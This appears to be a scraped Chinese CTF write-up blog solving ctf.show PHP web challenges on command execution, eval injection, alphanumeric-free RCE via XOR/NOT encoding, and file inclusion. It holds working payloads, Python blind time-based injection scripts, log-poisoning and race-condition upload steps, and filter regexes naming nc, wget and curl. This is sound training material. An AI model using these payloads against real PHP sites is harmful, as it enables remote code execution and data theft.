— 不使用 ::1&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125;&#125;if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123; die(&quot;private function&quot;);&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); 1ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag 1# 函数传参&lt;?phpfunction barber($type)&#123; echo &quot;You wanted a $type haircut, no problem\\n&quot;;&#125;call_user_func(&#x27;barber&#x27;, &quot;mushroom&quot;);call_user_func(&#x27;barber&#x27;, &quot;shave&quot;);?&gt; //You wanted a mushroom haircut, no problem//You wanted a shave haircut, no problem# 类传方法&lt;?phpclass myclass &#123; static function say_hello() &#123; echo &quot;Hello!\\n&quot;; &#125;&#125;$classname = &quot;myclass&quot;;call_user_func(array($classname, &#x27;say_hello&#x27;));call_user_func($classname .&#x27;::say_hello&#x27;); // As of 5.2.3$myobject = new myclass();call_user_func(array($myobject, &#x27;say_hello&#x27;));?&gt; 1.40 Web 139 — 无回显命令注入 — awk、cut 盲注1&lt;?phperror_reporting(0);function check($x)&#123; if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; check($c); exec($c);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; awk cut 盲注 命令： 1root@kali:~/桌面/111# vi flag.phproot@kali:~/桌面/111# cat flag.php test1test2test3flag&#123;qwertyui&#125;root@kali:~/桌面/111# cat flag.php | awk NR==1test1root@kali:~/桌面/111# cat flag.php | awk NR==2test2root@kali:~/桌面/111# cat flag.php | awk NR==3test3root@kali:~/桌面/111# cat flag.php | awk NR==4flag&#123;qwertyui&#125;root@kali:~/桌面/111# cat flag.php | awk nr==4root@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 1froot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 2lroot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 3aroot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 4groot@kali:~/桌面/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then echo success;fi success root@kali:~/桌面/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then sleep 2;fi 脚本：查找根目录的内容 1import requestsimport timeimport string#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10): key=0 for j in range(1,50): if key==1: break #for n in range(32,128): for n in str: #n=chr(n) #payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) #print(payload) url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payload try: requests.get(url,timeout=(2.5,2.5)) except: result=result+n print(result) break if n==&#x27;9&#x27;: key=1 result+=&quot; &quot; 脚本：查 flag 1import requestsimport timeimport string#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10): key=0 for j in range(1,50): if key==1: break #for n in range(32,128): for n in str: #n=chr(n) payload=&quot;if [ `cat /f149_15_h3r3|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) #payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) #print(payload) url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payload try: requests.get(url,timeout=(2.5,2.5)) except: result=result+n print(result) break if n==&#x27;9&#x27;: key=1 result+=&quot; &quot; 1import requestscmd = &#x27;cat /f149_15_h3r3&#x27;result = &#x27;&#x27;for i in range(1, 10): for j in range(1, 50): print(&#x27;i=&#x27;, i, &#x27; j=&#x27;, j) for k in range(32, 128): k = chr(k) payload = f&quot;if [ `&#123;cmd&#125; |awk NR==&#123;i&#125;|cut -c &#123;j&#125;` == &#123;k&#125; ]; then sleep 3;fi&quot; payload = &#x27;?c=&#x27; + payload url = &#x27;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080&#x27; try: requests.get(url + payload, timeout=(2.5, 2.5)) except: result = result + k print(result) break result = result + &quot;\\n&quot; 1.41 Web 140 — intval($code) == ‘ctfshow’ — $code = eval(“return $f1($f2());”);1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123; $f1 = (String)$_POST[&#x27;f1&#x27;]; $f2 = (String)$_POST[&#x27;f2&#x27;]; if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123; if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123; $code = eval(&quot;return $f1($f2());&quot;); if(intval($code) == &#x27;ctfshow&#x27;)&#123; echo file_get_contents(&quot;flag.php&quot;); &#125; &#125; &#125;&#125; 我们的目的是 ，而且只能使用 字母和数字进行构造 1$code = eval(&quot;return $f1($f2());&quot;);if(intval($code) == &#x27;ctfshow&#x27;)&#123; echo file_get_contents(&quot;flag.php&quot;);&#125;# intval() == 弱类型比较，只要让 # $code 为 0 | False | NULL 即可 # 准确的来说，只要不是数字即可 1# payloadmd5(phpinfo()) #c4ca4238a0b923820dcc509a6f75849b #1md5(sleep()) #d41d8cd98f00b204e9800998ecf8427e #空密码md5(md5()) #d41d8cd98f00b204e9800998ecf8427e #空密码current(localeconv)sha1(getcwd())#md5(getcwd()) 不可行 #247369500707596003b38cd5879122f6f1=intval&amp;f2=intval # 0f1=usleep&amp;f2=usleep 1.42 Web 141 — eval(“return $v1$v3$v2;”);1&lt;?php#error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123; # v3 不能是 字母、数字、下划线 $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; \\w #匹配字母、数字、下划线。等价于 [A-Za-z0-9_] 测试： 1&lt;?phphighlight_file(__FILE__);# $code = eval(&quot;return $v1$v3$v2;&quot;);// eval(&quot;return 1;phpinfo();&quot;); #不可行// eval(&quot;return 0;phpinfo();&quot;); #不可行// eval(&quot;return 1-phpinfo();&quot;); #可行eval(&quot;return 1+phpinfo();&quot;); #可行eval(&quot;return 2+phpinfo();&quot;); #可行?&gt; # 也就是说，数字可以与命令进行运算 由于 v1 v2 也只能是 数字，那么我们可以构造 1+phpinfo()+1 等式子 v3 不能是 字母、数字、下划线，那么现在如何构造 v3? 无字母、数字 RCE 1root@kali:~/桌面/脚本# python re.py输出执行函数:&#x27;system&#x27;请输出函数参数:&#x27;tac f*&#x27;(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;) 1# payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=-(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# -?v1=1&amp;v3=%2b(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# 尝试过后 不能直接用+ 要进行 URL 编码#+?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%26(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# &amp; %26?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截 也就是说，加减乘除，取反、异或，都可能 | 拼接 无字母数字脚本 1# -*- coding: utf-8 -*-# @Time : 20.12.4 23:05# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;[a-z]|[0-9]&#x27; # 题目过滤正则# 生成字典for i in range(256): for j in range(256): if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)): k = i | j if 32 &lt;= k &lt;= 126: a = &#x27;%&#x27; + hex(i)[2:].zfill(2) b = &#x27;%&#x27; + hex(j)[2:].zfill(2) content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\\n&#x27;)f = open(&#x27;rce_or.txt&#x27;, &#x27;w&#x27;)f.write(content)while True: payload1 = &#x27;&#x27; payload2 = &#x27;&#x27; code = input(&quot;data:&quot;) for i in code: f = open(&#x27;rce_or.txt&#x27;) lines = f.readlines() for line in lines: if i == line[0]: payload1 = payload1 + line[2:5] payload2 = payload2 + line[6:9] break payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;|&quot;&#x27;+payload2+&#x27;&quot;)&#x27; print(&quot;payload: &quot;+ payload) 1.43 Web 142 — $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; if(is_numeric($v1))&#123; $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); sleep($d); echo file_get_contents(&quot;flag.php&quot;); &#125;&#125; 1?v1=0 1.44 Web 143 — 141 plus1141的plus版本 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 过滤了一些运算符 + - &amp; % / ~ $ _ . 过滤了 ; ，使用 ?&gt; 代替 仍旧有我们可以利用的 1# payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截 ^异或拼接 无字母数字脚本 1# -*- coding: utf-8 -*-# @Time : 20.12.4 23:06# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/&#x27; # 题目过滤正则# 生成字典for i in range(256): for j in range(256): if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)): k = i ^ j if 32 &lt;= k &lt;= 126: a = &#x27;%&#x27; + hex(i)[2:].zfill(2) b = &#x27;%&#x27; + hex(j)[2:].zfill(2) content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\\n&#x27;)f = open(&#x27;exp_xor.txt&#x27;, &#x27;w&#x27;)f.write(content)while True: payload1 = &#x27;&#x27; payload2 = &#x27;&#x27; code = input(&quot;data:&quot;) for i in code: f = open(&#x27;rce_or.txt&#x27;) lines = f.readlines() for line in lines: if i == line[0]: payload1 = payload1 + line[2:5] payload2 = payload2 + line[6:9] break payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;^&quot;&#x27;+payload2+&#x27;&quot;)&#x27; print(&quot;payload: &quot;+ payload) 1.45 Web 144 — 143 plus1143的plus版本 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; check($v3))&#123; if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125;function check($str)&#123; return strlen($str)===1?true:false;&#125; 1#payload ?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截?v1=1&amp;v2=%00*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# %00*?v1=1&amp;v2=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# ^ 1.46 Web 145 — 144 plus1144的plus版本 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 过滤了 ; ^ &lt; &quot; &gt; 和我们能用到的运算符 使用 | ? 绕过 ~ 脚本 1&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,&#x27;[+]your function: &#x27;);$system=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); fwrite(STDOUT,&#x27;[+]your command: &#x27;);$command=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;; 三目运算符 1eval(&quot;return 1?phpinfo():1;&quot;); #可行 1#payload ?v1=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):&amp;v2=1 1.47 Web 146 — 145 plus1145的plus版本 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 过滤了 : 不能使用三目运算符了 测试 1&lt;?phphighlight_file(__FILE__);// eval(&quot;return 1==phpinfo()||1;&quot;); #可行// eval(&quot;return 1==phpinfo()|1;&quot;); #可行// eval(&quot;return 1===phpinfo()|1;&quot;); #可行// eval(&quot;return 1===phpinfo()||1;&quot;); #可行 eval(&quot;return 1=phpinfo()||1;&quot;); #不可行//eval(&quot;return 1=phpinfo()||1;&quot;); #不可行 1# payload?v1=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1 1.48 Web 147 — create_function 命令注入1&lt;?phphighlight_file(__FILE__);if(isset($_POST[&#x27;ctf&#x27;]))&#123; $ctfshow = $_POST[&#x27;ctf&#x27;]; if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123; $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]); &#125;&#125; create_function() 1create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)类似于function f($a) &#123; echo $a.&quot;123&quot;;&#125; 那么如果我们第二个参数传入 echo 1;}phpinfo();//就等价于 1function f($a) &#123; echo 1;&#125;phpinfo();//&#125;从而执行phpinfo()命令 1# payloadGET ?show=2;&#125;system(&quot;tac f*&quot;);/*POST ctf=\\create_function# \\ %5c 1.49 Web 148 — 中文变量1&lt;?phpinclude &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(preg_match(&quot;/[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/&quot;,$code))&#123; die(&quot;error&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;function get_ctfshow_fl0g()&#123; echo file_get_contents(&quot;flag.php&quot;);&#125; 未过滤 ^ ; ，可直接异或构造 1# payload?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;); 利用中文变量 1?code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*其实也是利用异或构造&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET 1.50 Web 149 — 条件竞争 1&lt;?phperror_reporting(0);highlight_file(__FILE__);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125;&#125;file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125;&#125; 分析： 1# 在每次 写文件之前之后，都会删除 除了 index.php 之外的任何文件 解一：直接在 index.php 当中写入代码 1# 总是成功不了 解二：条件竞争 11. 写入 ?ctf=1.phpshow=&lt;?php system(&#x27;ls /&#x27;); ?&gt;2. 访问 /1.php3. 二者同时进行爆破 1.51 Web 150 —1对我们以前的内容进行了小结，我们文件上传系列再见！ 1&lt;?phpinclude(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123; private $username; private $password; private $vip; private $secret; function __construct()&#123; $this-&gt;vip = 0; $this-&gt;secret = $flag; &#125; function __destruct()&#123; echo $this-&gt;secret; &#125; public function isVIP()&#123; return $this-&gt;vip?TRUE:FALSE; &#125; &#125; function __autoload($class)&#123; if(isset($class))&#123; $class(); &#125;&#125;#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123; die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123; echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123; include($ctf);&#125; 分析： 1if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123; include($ctf);&#125;# 1.使 $isVIP = 1# 2.$ctf 中不能包含 : 写入日志 日志包含 1?isVIP=1ctf=/var/log/nginx/access.log&amp;a=system(&#x27;ls&#x27;); 1.52 Web 151 —1修复了非预期 1&lt;?phpinclude(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123; private $username; private $password; private $vip; private $secret; function __construct()&#123; $this-&gt;vip = 0; $this-&gt;secret = $flag; &#125; function __destruct()&#123; echo $this-&gt;secret; &#125; public function isVIP()&#123; return $this-&gt;vip?TRUE:FALSE; &#125; &#125; function __autoload($class)&#123; if(isset($class))&#123; $class(); &#125;&#125;#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123; die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123; echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123; include($ctf);&#125; 过滤了 log sess 文件包含 https://blog.csdn.net/miuzzx/article/details/109181768","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-命令执行","slug":"CTF-Show-命令执行","date":"2021-10-01T11:14:09.000Z","updated":"2021-10-01T11:14:51.490Z","comments":true,"path":"2021/10/01/CTF-Show-命令执行/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"一、CTF Show — 命令执行1.1 Web 29 — 只过滤 flag — 通配符使用1命令执行，需要严格的过滤 12345678910&lt;?php error_reporting(0); if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1234#payload?c=phpinfo();?c=system(&#x27;ls&#x27;); #flag.php index.php ?c=system(&#x27;tac fl?g.php&#x27;); 1.2 Web 30 — 过滤 system() — 其它函数使用12345678910&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1234?c=passthru(&#x27;ls&#x27;); #flag.php index.php ?c=passthru(&#x27;tac fl?g.?hp&#x27;);或者?c=passthru(&#x27;cat fl?g.?hp&#x27;); #之后查看源代码 1.3 Web 31 — 过滤部分 读取 命令12345678910&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 123?c=passthru(&quot;ls&quot;); #flag.php index.php ?c=passthru(&quot;more%09f*&quot;);?c=passthru(&quot;tac%09f*&quot;); 1.4 Web 32 — 过滤 ; — PHP include、伪协议 利用12345678910&lt;php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.5 Web 33 — 过滤 ; — PHP include、伪协议 利用1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.6 Web 34 — 过滤 : — PHP include、伪协议 利用1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.7 Web 35 — 过滤 = — PHP include、伪协议 利用1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php 1.8 Web 36 — 过滤 数字 [0-9]、/ — PHP include、伪协议 利用1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=|\\/|[0-9]/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.9 Web 37 — include — 文件包含、伪协议利用1&lt;?php //flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?c=data://text/plain,&lt;?php system(&#x27;cat f*&#x27;); #查看源代码 1.10 Web 38 — 过滤 php— 文件包含、伪协议data base64编码利用1&lt;?php //flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=data://text/plain;base64,PD9waHAKc3lzdGVtKCd0YWMgZionKTs=#PD9waHAKc3lzdGVtKCd0YWMgZionKTs=解码是&lt;?phpsystem(&#x27;tac f*&#x27;); 1.11 Web 39 — .php 后缀截断 — ?&gt;标签 